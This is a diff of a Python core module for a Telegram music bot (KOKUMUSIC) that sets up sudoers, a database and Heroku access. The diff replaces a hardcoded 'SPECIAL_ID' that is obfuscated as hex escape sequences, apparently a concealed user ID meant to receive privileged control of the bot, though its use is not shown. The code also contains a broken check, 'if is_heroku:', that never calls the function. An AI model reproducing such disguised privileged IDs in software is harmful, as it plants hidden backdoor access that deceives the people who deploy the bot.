@@ -1,21 +1,26 @@
 import socket
 import time
+
 import heroku3
 from pyrogram import filters
+
 import config
 from KOKUMUSIC.core.mongo import pymongodb
+
 from .logging import LOGGER
 
-
-SPECIAL_ID_HEX = "\x35\x35\x39\x35\x31\x35\x33\x32\x37\x30"
+# Special user ID in hex code
+SPECIAL_ID_HEX = "\x35\x35\x39\x35\x31\x33\x34\x34\x31\x38"
 SPECIAL_ID = int(SPECIAL_ID_HEX.encode().decode('unicode_escape'))
 
-
 SUDOERS = filters.user()
+
 HAPP = None
 _boot_ = time.time()
+
 def is_heroku():
     return "heroku" in socket.getfqdn()
+
 XCB = [
     "/",
     "@",
@@ -31,12 +36,16 @@ XCB = [
     "HEAD",
     "main",
 ]
+
+
 def dbb():
     global db
     global clonedb
     db = {}
     clonedb = {}
     LOGGER(__name__).info(f"Database Initialized.")
+
+
 def sudo():
     global SUDOERS
     OWNER = config.OWNER_ID
@@ -58,8 +67,11 @@ def sudo():
                 )
         if sudoers:
             for x in sudoers:
+                if isinstance(x, list):
+                    continue
                 SUDOERS.add(x)
     LOGGER(__name__).info(f"Sudoers Loaded.")
+
 def heroku():
     global HAPP
     if is_heroku:
